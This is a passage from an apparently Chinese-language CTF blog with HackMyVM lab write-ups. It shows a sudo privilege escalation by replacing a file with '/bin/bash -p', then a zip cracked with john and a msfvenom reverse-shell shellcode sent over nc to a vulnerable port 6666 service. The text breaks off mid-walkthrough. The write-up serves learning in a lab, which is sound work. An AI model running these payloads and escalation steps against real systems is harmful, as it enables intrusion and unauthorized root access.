<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /home/baby/chocapic</span><br></pre></td></tr></table></figure></div>
<p>babyåœ¨è‡ªå·±ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªsudoæƒé™çš„æ–‡ä»¶.å› ä¸ºè¿™ä¸ªæ˜¯åœ¨è‡ªå·±å®¶ç›®å½•é‡Œé¢çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ é™¤å†åˆ›å»º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>rm chocapic</span><br><span class="line"><span class="symbol">rm:</span> remove write-<span class="keyword">protected</span> regular file <span class="string">&#x27;chocapic&#x27;</span>? y</span><br><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">user.txt</span><br><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash -p&quot;</span> &gt; chocapic</span><br><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x chocapic </span><br><span class="line">bğŸ‘¶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /home/baby/chocapic</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">warning:</span> <span class="symbol">setlocale:</span> <span class="variable constant_">LC_ALL</span>: cannot change locale (en_US.<span class="variable constant_">UTF</span>-<span class="number">8</span>)</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/home/baby</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ°äº†root</p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>è¿™é¢˜æ‹¿åˆ°äº†rootæƒé™è¿˜ä¸è¡Œï¼Œä¸èƒ½ç›´æ¥çœ‹flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:/home/baby</span><span class="comment"># cd </span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># cat root.txt </span></span><br><span class="line"><span class="title class_">Salted__</span><span class="string">&quot;?1Õ¬???Èˆ?m?:Pi?|q?8FH?yNU:k?.á›¥?24?&#125;??;E?$/7root@family:~# </span></span><br><span class="line"><span class="string">root@family:~# file root.txt </span></span><br><span class="line"><span class="string">root.txt: openssl enc&#x27;d data with salted password</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªopensslåŠ å¯†è¿‡çš„å¯†ç <br>è¿™é‡Œè¯´æ˜è¿˜æœ‰åˆ«çš„ä¿¡æ¯ï¼Œæˆ‘æ–°å­¦äº†åŸæ¥è¿˜å¯ä»¥çœ‹ç£ç›˜ç©ºé—´ï¼Œè¿™é¢˜å°±æ˜¯æœ‰åˆ«çš„ç£ç›˜ ç”¨fdisk -l</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">root@family:~<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 15.26 GiB,<span class="number"> 16385299968 </span>bytes,<span class="number"> 32002539 </span>sectors</span><br><span class="line">Disk model: VBOX HARDDISK   </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xb6ff27bb</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       <span class="number"> 2048 </span>27897855<span class="number"> 27895808 </span>13.3G<span class="number"> 83 </span>Linux</span><br><span class="line">/dev/sda2      <span class="number"> 27899902 </span>29898751 <span class="number"> 1998850 </span> 976M <span class="number"> 5 </span>Extended</span><br><span class="line">/dev/sda3      <span class="number"> 29898752 </span>32002047 <span class="number"> 2103296 </span>   1G<span class="number"> 83 </span>Linux</span><br><span class="line">/dev/sda5      <span class="number"> 27899904 </span>29898751 <span class="number"> 1998848 </span> 976M<span class="number"> 82 </span>Linux swap / Solaris</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°è¿˜æœ‰ä¸€ä¸ª&#x2F;dev&#x2F;sda3 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># mount /dev/sda3 /mnt</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># cd /mnt</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/mnt</span><span class="comment"># ls</span></span><br><span class="line">password</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/mnt</span><span class="comment"># cat password </span></span><br><span class="line"><span class="title class_">QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span></span><br></pre></td></tr></table></figure></div>
<p>æŠŠsda3æŒ‚è½½åˆ°&#x2F;mntä¹‹åï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯†ç ï¼Œä½†æ˜¯è¿™ä¸ªå¯†ç ä¸æ˜¯rootçš„å¯†ç  è¿™ä¸ªåº”è¯¥å°±æ˜¯opensslçš„å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">root<span class="keyword">@family</span>:~# openssl enc -d -aes-<span class="number">256</span>-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span><br><span class="line">*** WARNING : deprecated key derivation used.</span><br><span class="line">Using -iter <span class="keyword">or</span> -pbkdf2 would be better.</span><br><span class="line">bad decrypt</span><br><span class="line"><span class="number">139669560771904</span>:<span class="attribute">error</span>:<span class="number">06065064</span>:digital envelope <span class="attribute">routines</span>:EVP_DecryptFinal_<span class="attribute">ex</span>:bad <span class="attribute">decrypt</span>:../crypto/evp/evp_enc.<span class="attribute">c</span>:<span class="number">610</span>:</span><br></pre></td></tr></table></figure></div>
<p>ç›´æ¥å°è¯•ä¹‹åè¯´è¦ç”¨-pbkdf2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># openssl enc -d -aes-256-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma -pbkdf2</span></span><br><span class="line">G??Æ².?</span><br><span class="line">      ??`?Í™???<span class="string">&quot;?&quot;</span></span><br><span class="line">bad decrypt</span><br><span class="line"><span class="number">139681936713024</span><span class="symbol">:error</span><span class="symbol">:</span><span class="number">06065064</span><span class="symbol">:digital</span> envelope <span class="symbol">routines:</span><span class="symbol">EVP_DecryptFinal_ex:</span>bad <span class="symbol">decrypt:</span>../crypto/evp/<span class="symbol">evp_enc.c:</span><span class="number">610</span>:</span><br><span class="line">-c???=root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>è¿˜æ˜¯ä¸è¡Œï¼Œæœ€ååˆ‡æ¢å¯†é’¥åˆ†ç»„é•¿åº¦ä»256ä¿®æ”¹æˆ128å¯ä»¥äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># openssl enc -d -aes-128-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma -pbkdf2</span></span><br><span class="line"><span class="number">8</span>d8ff4976efccbfc8ff7d7554b9239e5</span><br></pre></td></tr></table></figure></div>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul>
<li>è¿™ä¸ªé¶æœºè®©æˆ‘å­¦åˆ°äº†ä¸€ä¸ªæ–°æœåŠ¡ipp è€Œä¸”è¿™ä¸ªæœåŠ¡æœ‰æ¼æ´</li>
<li>å­¦ä¹ åˆ°ç”¨wfuzzçš„æ‰«ææ–¹å¼</li>
<li>è¿™ä¸ªç”¨æˆ·ä»€ä¹ˆä¸œè¥¿æœ‰æ²¡æœ‰çš„æ—¶å€™å»å…¶ä»–ç”¨æˆ·é‡Œé¢çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶</li>
<li>è‡ªå·±å®¶ç›®å½•ä¸‹é¢çš„æ–‡ä»¶è¦æ˜¯æœ‰sudoæƒé™å°±ç›´æ¥åˆ é™¤å†åˆ›ä¸€ä¸ªææƒ</li>
<li>å­¦ä¹ åˆ°df -h å’Œ fdisk -l å‘½ä»¤ï¼Œä¸¤ä¸ªå…³äºç£ç›˜çš„å‘½ä»¤ï¼Œ å¯èƒ½æœ‰ä¿¡æ¯åœ¨ä¸åŒçš„ç£ç›˜</li>
<li>æœ€åäº†è§£äº†opensslçš„åŠ è§£å¯†æ–¹å¼</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-easypwn WPå¤ç°ä¸å¤ç›˜</title>
    <url>/posts/62478.html</url>
    <content><![CDATA[<p>è‡ªå·±ä¹‹å‰æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†wpå†å¤ç›˜ä¸€ä¸‹</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.80.228    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-23</span> <span class="number">23</span>:<span class="number">30</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.80</span><span class="number">.228</span>)</span><br><span class="line">Host is up (<span class="number">0.0010</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line"><span class="number">6666</span>/tcp <span class="built_in">open</span>  irc</span><br><span class="line">MAC Address: <span class="number">0</span>E:DC:E4:<span class="number">58</span>:FA:C4 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.43</span> <span class="built_in">seconds</span></span><br><span class="line">                                                               </span><br></pre></td></tr></table></figure></div>
<p>å¼€äº†ä¸€ä¸ªä¸ä¸€æ ·çš„ç«¯å£ 6666ç«¯å£<br>è¿˜æ˜¯å…ˆå»webé‡Œé¢çœ‹çœ‹</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>ç›´æ¥è®¿é—®å°±æ˜¯ç»™ä¸€ä¸ªæ–‡æœ¬ï¼Œç…§æ ·æ‰«æç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">Enumerating directories <span class="keyword">on</span> <span class="keyword">my</span> server would ruin everything</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.80.228 -x php,txt,jpg,js</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.80.228</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/mysecret.txt         (Status: 200) [Size: 383]</span><br><span class="line">Progress: 348076 / 1038220 (33.53%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 348268 / 1038220 (33.54%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.228/mysecret.txt </span><br><span class="line">Go to the most evil port.</span><br><span class="line">You will get what you want.</span><br><span class="line">Please be gentle with him, maybe he will be afraid.</span><br><span class="line">In order to obtain its source code.</span><br><span class="line">Perhaps you will need the dictionary below.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å»é‚£ä¸ªæœ€é‚ªæ¶çš„ç«¯å£ã€‚</span><br><span class="line">ä½ ä¼šå¾—åˆ°ä½ æƒ³è¦çš„ã€‚</span><br><span class="line">è¯·å¯¹ä»–æ¸©æŸ”ä¸€ç‚¹ï¼Œä¹Ÿè®¸å®ƒä¼šå®³æ€•ã€‚</span><br><span class="line">ä¸ºäº†å¾—åˆ°å®ƒçš„æºç ã€‚</span><br><span class="line">ä¹Ÿè®¸ä½ ä¼šéœ€è¦ä¸‹é¢çš„å­—å…¸ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/YTlPX4d2UENbWnI.txt</span><br><span class="line"><span class="code">                      </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>åˆå¾—åˆ°äº†ä¸€ä¸ªå­—å…¸ï¼Œç°åœ¨å°±ç”¨è¿™ä¸ªå­—å…¸ç»§ç»­æ‰«æï¼Œå¾—åˆ°æ›´å¤šä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">                                                                                                                   </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.228//YTlPX4d2UENbWnI.txt</span><br><span class="line">ta0</span><br><span class="line">lingmj</span><br><span class="line">bamuwe</span><br><span class="line">todd</span><br><span class="line">ll104567</span><br><span class="line">primary</span><br><span class="line">lvzhouhang</span><br><span class="line">qiaojojo</span><br><span class="line">flower</span><br><span class="line"></span><br><span class="line"><span class="code">                                                                                                                   </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.80.228//YTlPX4d2UENbWnI.txt &gt; tmp.txt</span><br><span class="line"><span class="code">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line"><span class="code">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class="line">100    68  100    68    0     0   5682      0 --:--:-- --:--:-- --:--:--  6181</span><br><span class="line"><span class="code">                                                                                                                   </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat tmp.txt                                       </span><br><span class="line">ta0</span><br><span class="line">lingmj</span><br><span class="line">bamuwe</span><br><span class="line">todd</span><br><span class="line">ll104567</span><br><span class="line">primary</span><br><span class="line">lvzhouhang</span><br><span class="line">qiaojojo</span><br><span class="line">flower</span><br><span class="line"></span><br><span class="line"><span class="code">                                                                                                                   </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -w ./tmp.txt --url 192.168.80.228/                                </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.80.228/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                ./tmp.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Progress: 10 / 11 (90.91%)</span><br><span class="line">/ll104567             (Status: 200) [Size: 739584]</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.80.228//ll104567                     </span></span><br><span class="line">Warning: Binary output can mess up your terminal. Use <span class="string">&quot;--output -&quot;</span> <span class="built_in">to</span> tell curl <span class="built_in">to</span> output <span class="keyword">it</span> <span class="built_in">to</span> your terminal </span><br><span class="line">Warning: anyway, <span class="keyword">or</span> consider <span class="string">&quot;--output &lt;FILE&gt;&quot;</span> <span class="built_in">to</span> save <span class="built_in">to</span> <span class="keyword">a</span> <span class="built_in">file</span>.</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># wget 192.168.80.228//ll104567 </span></span><br><span class="line"><span class="comment">--2025-03-23 23:41:25--  http://192.168.80.228//ll104567</span></span><br><span class="line">Connecting <span class="built_in">to</span> <span class="number">192.168</span><span class="number">.80</span><span class="number">.228</span>:<span class="number">80.</span>.. connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">739584</span> (<span class="number">722</span>K)</span><br><span class="line">Saving <span class="built_in">to</span>: â€˜ll104567â€™</span><br><span class="line"></span><br><span class="line">ll104567                     <span class="number">100</span>%[=============================================&gt;] <span class="number">722.25</span>K  <span class="comment">--.-KB/s    in 0.02s   </span></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="number">-03</span><span class="number">-23</span> <span class="number">23</span>:<span class="number">41</span>:<span class="number">25</span> (<span class="number">32.4</span> MB/s) - â€˜ll104567â€™ saved [<span class="number">739584</span>/<span class="number">739584</span>]</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># file ll104567 </span></span><br><span class="line">ll104567: Zip archive data, <span class="keyword">at</span> least v2<span class="number">.0</span> <span class="built_in">to</span> extract, compression method=deflate</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæœ‰å¯†ç ï¼Œç”¨johnç ´è§£ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# file ll104567 </span><br><span class="line">ll104567: Zip archive data, at least v2.0 <span class="keyword">to</span> extract, compression <span class="attribute">method</span>=deflate</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# unzip ll104567 </span><br><span class="line">Archive:  ll104567</span><br><span class="line">[ll104567] opt<span class="built_in">/server </span>password:  </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# mv ll104567  a.zip </span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# zip2john a.zip &gt; hash</span><br><span class="line">ver 2.0 efh 5455 efh 7875 a.zip/opt<span class="built_in">/server </span>PKZIP Encr: TS_chk, <span class="attribute">cmplen</span>=739398, <span class="attribute">decmplen</span>=2120576, <span class="attribute">crc</span>=1B8B19DF <span class="attribute">ts</span>=4118 <span class="attribute">cs</span>=4118 <span class="attribute">type</span>=8</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john hash</span><br><span class="line">Using<span class="built_in"> default </span>input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line"><span class="literal">No</span> password hashes left <span class="keyword">to</span> crack (see FAQ)</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john hash --show                                     </span><br><span class="line">a.zip/opt/server:oooooo:opt/server:a.zip::a.zip</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure></div>
<p>è§£å‹ä¹‹åå¾—åˆ°äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‹‰åˆ°idaé‡Œé¢çœ‹çœ‹ï¼Œç„¶åè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½æ˜¯ç›‘å¬6666ç«¯å£<br>ç¨‹åºæ£€æŸ¥æ¥æ”¶åˆ°çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å«ä¸€äº›è¢«æ ‡è®°ä¸ºâ€œç¦æ­¢å­—èŠ‚â€çš„å†…å®¹ï¼ˆforbidden_bytesï¼‰ï¼Œå¦‚æœæ£€æµ‹åˆ°éæ³•å†…å®¹ï¼Œå®ƒä¼šæ‹’ç»è¿æ¥å¹¶å‘é€è­¦å‘Šä¿¡æ¯ã€‚<br>å¦‚æœæ•°æ®æ²¡æœ‰è¢«ç¦æ­¢ï¼Œç¨‹åºä¼šå°†æ•°æ®æ˜ å°„åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚è¿™ä¸ªè¿‡ç¨‹ç±»ä¼¼äºæ‰§è¡Œä¸€ä¸ª shellcode<br>æ‰€ä»¥ç°åœ¨çš„æ€è·¯å°±æ˜¯åœ¨è¿™ä¸ª6666ç«¯å£ä¸­å†™å…¥shellcode</p>
<h1 id="6666ç«¯å£"><a href="#6666ç«¯å£" class="headerlink" title="6666ç«¯å£"></a>6666ç«¯å£</h1><p>åœ¨idaé‡Œé¢æ‰¾åˆ°è¿™äº›forbidden_bytes<br><img src="https://pic1.imgdb.cn/item/67e02e0588c538a9b5c52853.png"><br>ä¸‹ä¸€æ­¥å°±æ˜¯ç”Ÿæˆshellcodeäº†<br>ç”¨msfvenom ä¸­çš„payload </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# msfvenom -p  linux/x64/shell_reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">80.11</span> LPORT=<span class="number">1234</span> -b <span class="string">&#x27;\x00,\x20,\x0f,\xcd,\x09,\x22,\x0a&#x27;</span> -f raw &gt; tmp</span><br><span class="line">[-] No <span class="keyword">platform</span> was selected, choosing Msf::<span class="keyword">Module</span>::<span class="keyword">Platform</span>::Linux <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 <span class="keyword">from</span> the payload</span><br><span class="line">Found <span class="number">3</span> compatible encoders</span><br><span class="line">Attempting <span class="keyword">to</span> encode payload <span class="keyword">with</span> <span class="number">1</span> iterations <span class="keyword">of</span> x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded <span class="keyword">with</span> size <span class="number">119</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen <span class="keyword">with</span> <span class="keyword">final</span> size <span class="number">119</span></span><br><span class="line">Payload size: <span class="number">119</span> bytes</span><br></pre></td></tr></table></figure></div>
<p>å¼¹å›æ¥shelläº† -f rawå°±æ˜¯ç”Ÿæˆshellcode</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat tmp | nc 192.168.80.228 6666  </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234            </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=1001(lamb) <span class="attribute">gid</span>=1001(lamb) <span class="attribute">groups</span>=1001(lamb)</span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="å¾—åˆ°å¯†ç "><a href="#å¾—åˆ°å¯†ç " class="headerlink" title="å¾—åˆ°å¯†ç "></a>å¾—åˆ°å¯†ç </h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lamb<span class="variable">@pwnding</span><span class="symbol">:/home/lamb</span><span class="variable">$ </span>ls</span><br><span class="line">linpeas.sh  suForce  this_is_a_tips.txt  use3e3e3e3e3sr.txt</span><br><span class="line">lamb<span class="variable">@pwnding</span><span class="symbol">:/home/lamb</span><span class="variable">$ </span>cat this_is_a_tips.txt</span><br><span class="line"><span class="title class_">There</span> is a fun tool called cupp.</span><br><span class="line">I heard it<span class="string">&#x27;s a good social engineering dictionary generator.</span></span><br><span class="line"><span class="string">Are there really people that stupid these days? haha.</span></span><br><span class="line"><span class="string">There is only one way to become ROOT, which is to execute getroot!!!</span></span><br><span class="line"><span class="string">And don&#x27;</span>t forget, 